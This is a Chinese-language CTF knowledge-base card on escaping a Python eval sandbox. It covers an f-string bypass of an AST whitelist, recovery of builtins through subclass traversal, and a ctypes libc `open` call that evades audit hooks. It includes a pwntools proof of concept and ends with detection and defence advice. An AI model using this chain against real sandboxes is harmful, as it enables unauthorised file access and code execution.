---
id: binary-pwn-sandbox-escape-python-ast-joinedstr-ctypes-open
title: Python AST 白名单 + 审计钩子沙箱逃逸：JoinedStr 未递归与 ctypes 原生 open
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-ast-joinedstr-ctypes-audit-hook-bypass
tags:
- python
- pyjail
- sandbox-escape
- ast
- audit-hook
- ctypes
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T10:01:37+08:00'
  notes: 已对照原文（无图片）核对：Calculator.visit 对 ast.JoinedStr 直接 pass 不递归子节点，f"{()}" 可绕过 AST；空 builtins 经 _wrap_close.__init__.__globals__ 恢复；ctypes.CDLL(None).open 原生调用绕过 open 审计事件，__imp+ort__ 绕过 import 字符串检查，链与原文一致。卡片已将原文 __builtins__['read'] 修正为 _wrap_close.__globals__['os'].read 并注明版本差异。PoC 未在本机执行
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-ast-joinedstr-ctypes-open/
draft: false
kb_aliases:
- pCalc
- f-string bypass
- JoinedStr
- ctypes open
- Python jail escape
- AST 沙箱
---

## 一句话结论

计算器 jail 的 AST 白名单只检查列出的节点类型，却对 `ast.JoinedStr` 直接 `pass`、不递归子节点，因此把任意表达式塞进 f-string（如 `f"{()}"`）就能绕过节点类型检查；在 `eval(..., {"__builtins__": {}})` 下再沿 `().__class__.__bases__[0].__subclasses__()` 找到 `_wrap_close` 的 `__init__.__globals__` 恢复 builtins，最后用 `ctypes.CDLL(None).open(b'flag.txt', 0, 0)` 直接调用 libc 的 `open`，不触发 Python 审计钩子的 `open` 事件，从而读取 flag。

## 原理

- **AST 白名单的结构性缺陷**：
  ```python
  def visit(self, node):
      if isinstance(node, (ast.Module, ast.Expr, ast.BinOp, ast.UnaryOp,
                           ast.Constant, ast.Name, ast.Load,
                           ast.operator, ast.unaryop)):
          super().visit(node)
      elif isinstance(node, ast.JoinedStr):
          pass
      else:
          print("Forbidden node type")
          self.is_valid = False
  ```
  `JoinedStr`（f-string）分支直接返回，没有调用 `generic_visit`，其子节点 `FormattedValue`、`Tuple`、`Call`、`Attribute`、`Subscript` 等完全不会被访问。于是 `()` 本身会被判为 `Tuple` 拒绝，但 `f"{()}"` 只暴露一个 `JoinedStr`，可以通过检查；`eval` 时 f-string 仍会求值其中的表达式。
- **空 builtins 不切断对象图**：`eval(user_input, {"__builtins__": {}})` 只是让当前帧没有 `__import__`/`open`/`print`，但字面量 `()`、`[]`、`""` 仍可沿 `__class__`、`__bases__`、`__subclasses__()` 找到已加载的类。`_wrap_close.__init__` 是 Python 函数，其 `__globals__` 指向 `subprocess` 模块字典，里面有 `os`、`__builtins__`（含 `__import__`/`print`）、`system` 等。
- **审计钩子的盲区**：
  ```python
  def audit_hook(event, args):
      if event in ['os.system', 'os.popen', 'os.spawn', 'subprocess.Popen']:
          raise RuntimeError("Blocked Action Detected")
      if event == 'open' and isinstance(args[0], str) and 'flag' in args[0]:
          raise RuntimeError("Forbidden File Access")
  ```
  `sys.addaudithook` 只覆盖 CPython 主动触发审计事件的 API（如 `io.open`、`os.open`、`os.system`）。`ctypes.CDLL(None)` 绑定当前进程的 libc，`.open(b'flag.txt', 0, 0)` 是直接调用原生函数，不经过 CPython 的 `open` 审计路径；随后 `os.read(fd, 512)` 也不在被禁事件列表里，因此可以读到 flag。
- **字符串黑名单绕过**：程序只检查 `"import" in user_input`。`'__imp' + 'ort__'` 在 f-string 表达式求值时拼成 `__import__`，源码中不出现连续的 `import`；`open`/`flag` 等词不在输入过滤范围（`flag` 的检查在审计钩子里，而该路径被 ctypes 绕开）。
- **结果类型不影响副作用**：`eval` 的返回值必须是 `int`/`float`/`complex` 才打印，但利用发生在求值阶段；f-string 返回字符串后程序只会打印 "Error: Calculator only supports numbers."，flag 已经由内层 `print` 输出。
- **`_wrap_close` 的前置条件**：`_wrap_close` 来自 `subprocess` 模块，目标进程需已加载 `subprocess`。若未加载，可换 `warnings.catch_warnings`、`importlib._bootstrap.BuiltinImporter` 等类的 `__init__.__globals__` 恢复 `__builtins__`/`os`；按类名过滤比硬编码下标稳。

## 触发条件

- 目标把用户输入交给 `eval`/`exec`，并用 AST `NodeVisitor` 做节点类型白名单。
- 白名单实现中对容器节点（尤其 `JoinedStr`）直接 `pass` 或只检查父节点，未递归检查全部子节点。
- `eval` 的 globals 删除了 `__builtins__`，但进程内仍加载了 `subprocess`、`warnings`、`importlib` 等模块。
- 使用 `sys.addaudithook` 作为主要隔离，且未禁止 `ctypes`/`cffi` 等原生调用；没有独立进程/容器/seccomp 级隔离。

## 利用步骤

1. **探测 AST 白名单**：提交 `()`，应报 `Forbidden node type 'Tuple'`；提交 `f"{()}"`，若不再报错，说明 `JoinedStr` 子节点未被递归检查。
2. **确认 eval 环境**：提交 `f"{().__class__.__bases__}"` 等表达式，观察是否能访问对象模型；空 builtins 不影响字面量属性链。
3. **恢复 builtins/os**：用 `().__class__.__bases__[0].__subclasses__()` 按 `__name__ == '_wrap_close'` 取类，读取 `__init__.__globals__`；从中取 `__builtins__` 的 `print`/`__import__` 与 `os` 模块。
4. **枚举目录**：先用 `__builtins__['listdir']()` 或 `os.listdir()` 确认 flag 文件名（如 `flag.txt`）。
5. **绕过审计钩子读文件**：
   - 首选 `ctypes.CDLL(None).open(b'flag.txt', 0, 0)` 拿 fd，再 `os.read(fd, 512)`；原生 `open` 不触发 Python `open` 事件。
   - 若允许 `os` 且钩子只检查 `str` 路径，`os.open(b'flag.txt', 0)` 的 bytes 路径也可能绕过 `isinstance(args[0], str)`（该变体未在原题验证）。
6. **输出结果**：用恢复的 `print` 打印读取到的 bytes；整个表达式包在 f-string 中提交，保证通过 AST 检查。

## PoC

```python
from pwn import remote, process

DEBUG = False
p = process(["python3", "chal.py"]) if DEBUG else remote("target.example", 1337, ssl=True)

# 1) 探测：() 被拒绝，f"{()}" 通过
p.sendlineafter(b">>> ", b'()')
p.sendlineafter(b">>> ", b'f"{()}"')

# 2) 恢复 _wrap_close 的模块 globals（subprocess 已加载时）
W = ("[c for c in ().__class__.__bases__[0].__subclasses__() "
     "if c.__name__ == '_wrap_close'][0].__init__.__globals__")

# 3) ctypes 原生 open + os.read 读取 flag
expr = (
    W + "['__builtins__']['print']("
    + W + "['os'].read("
    + W + "['__builtins__']['__imp'+'ort__']('ctypes').CDLL(None).open(b'flag.txt',0,0),"
    + "512))"
)
payload = ('f"{' + expr + '}"').encode()
p.sendlineafter(b">>> ", payload)
print(p.recvrepeat(2))
```

说明：以上为按原题 payload 整理并修正的结构化 PoC，未在本机执行。原题单行 payload 从 `__builtins__['read']` 取 `read`，不同 Python 版本的内建字典不一定有该项；这里改为从 `_wrap_close.__init__.__globals__['os']` 取 `os.read`，并用 `ctypes.CDLL(None).open` 拿 fd。若目标未加载 `subprocess`，把 `_wrap_close` 换成 `catch_warnings`/`BuiltinImporter` 等类。

## 变体与关联

- **AST 变体**：`JoinedStr` 未递归、`FormattedValue` 未检查、只检查父节点不检查子节点、`ast.walk` 遗漏 `JoinedStr` 子节点；同类问题也出现在自定义 dis/字节码检查器中。
- **builtins 恢复变体**：`_wrap_close`、`warnings.catch_warnings`、`importlib._bootstrap.BuiltinImporter`、`SourceFileLoader` 的 `__init__.__globals__`；按类名过滤，避免硬编码下标。
- **审计钩子绕过变体**：ctypes/cffi 直接调用 libc；`os.open` 传 bytes 路径绕过 `isinstance(args[0], str)`；把 audit 依赖的全局名/内建污染掉（见关联卡）。
- **黑名单绕过变体**：`'__imp'+'ort__'`、`getattr` + 字符串拼接、chr/bytes 构造属性名；f-string 本身也能承载任意表达式。
- **关联卡片**：[[binary-pwn-sandbox-escape-python-jail-subclass-traversal]]（子类遍历基础）、[[binary-pwn-sandbox-escape-python-audit-hook-bypass]]（遮蔽钩子依赖的全局名）、[[binary-pwn-sandbox-escape-python-audit-hook-print-poisoning]]（污染 builtins.print 与 os._exit）、[[binary-pwn-sandbox-escape-nfkc-ast-name-decorator-cr-bypass]]（另一类 AST 绕过）。
- **边界**：若目标在独立进程/容器/seccomp 中运行、禁用 ctypes/cffi、以只读方式隔离 flag，或 AST 检查递归覆盖全部节点，则本条链不成立；`_wrap_close` 依赖 `subprocess` 已加载。

## 检测与防御

- **CTF/验证**：`f"{()}"` 若能通过 AST 检查即证明 `JoinedStr` 未递归；最终 payload 应输出 flag 文件内容，且不出现 `import` 连续字符串。
- **检测信号**：用户输入中出现 `f"{` 包裹的复杂表达式、`__class__`/`__bases__`/`__subclasses__`/`__globals__`/`__builtins__` 属性链、`ctypes`/`CDLL(None)`、`__imp`+`ort__` 拼接、`os.read` 配合原生 `open`。
- **防御（AST）**：用 `ast.walk` 遍历所有节点，对每种节点类型做显式允许/拒绝；`JoinedStr` 必须递归检查 `FormattedValue.value`；不要对容器节点直接 `pass`。更好的做法是不用 `eval`，而是实现只支持数字运算的 AST 解释器。
- **防御（隔离）**：审计钩子只能作为纵深防御，无法拦截 ctypes/cffi 的原生调用；应把不可信代码放到独立进程/容器，禁用 `ctypes`、限制文件系统与网络（seccomp/AppArmor/只读挂载），flag 不放在可读路径。
- **加固边界**：关键字黑名单、空 builtins、AST 白名单都只能提高门槛；对象图与原生调用面必须由系统级隔离兜底。
